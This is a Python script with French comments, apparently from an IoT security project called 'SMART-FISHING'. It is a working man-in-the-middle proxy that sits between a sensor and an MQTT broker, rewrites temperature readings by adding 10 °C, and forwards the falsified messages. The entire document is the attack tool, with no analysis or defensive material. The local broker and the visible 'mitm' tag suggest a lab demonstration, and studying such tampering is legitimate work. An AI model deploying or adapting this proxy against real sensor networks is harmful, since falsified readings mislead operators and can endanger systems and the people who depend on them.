#!/usr/bin/env python3
"""
Script MITM — SMART-FISHING
Intercepte et modifie les messages MQTT en temps réel
"""
import socket
import threading
import json
import re

BROKER = "localhost"
BROKER_PORT = 1883
PROXY_PORT = 1884

def handle_client(client_sock):
    """Gère la connexion d'un client (capteur) vers le broker"""
    broker_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    broker_sock.connect((BROKER, BROKER_PORT))
    print(f"[+] MITM actif : {client_sock.getpeername()} → Broker")

    def relay_client_to_broker():
        while True:
            try:
                data = client_sock.recv(4096)
                if not data:
                    break
                if b"temperature" in data or b"valeur" in data:
                    try:
                        payload_str = data.decode('utf-8', errors='ignore')
                        json_match = re.search(r'\{.*\}', payload_str)
                        if json_match:
                            json_str = json_match.group()
                            json_data = json.loads(json_str)
                            if 'valeur' in json_data:
                                temp_originale = json_data['valeur']
                                json_data['valeur'] = round(temp_originale + 10.0, 2)
                                json_data['mitm'] = True
                                print(f"[MITM] Température modifiée : {temp_originale}°C → {json_data['valeur']}°C")
                                new_json_str = json.dumps(json_data)
                                payload_str = payload_str.replace(json_str, new_json_str)
                                data = payload_str.encode('utf-8')
                    except Exception as e:
                        print(f"[MITM] Erreur : {e}")
                broker_sock.send(data)
            except Exception:
                break
        client_sock.close()
        broker_sock.close()

    def relay_broker_to_client():
        while True:
            try:
                data = broker_sock.recv(4096)
                if not data:
                    break
                client_sock.send(data)
            except Exception:
                break

    t1 = threading.Thread(target=relay_client_to_broker, daemon=True)
    t2 = threading.Thread(target=relay_broker_to_client, daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    print("[+] MITM terminé")

def main():
    """Lance le proxy MITM"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PROXY_PORT))
    server.listen(5)
    print(f"[+] Proxy MITM en écoute sur le port {PROXY_PORT}")
    print("[+] Configurez le capteur pour utiliser ce proxy !")
    print("[+] La température sera augmentée de 10°C")
    print("[+] Appuyez sur Ctrl+C pour arrêter\n")
    try:
        while True:
            client_sock, addr = server.accept()
            print(f"[+] Nouvelle connexion reçue de {addr}")
            thread = threading.Thread(target=handle_client, args=(client_sock,))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("\n[+] Arrêt du proxy MITM")
        server.close()

if __name__ == "__main__":
    main()
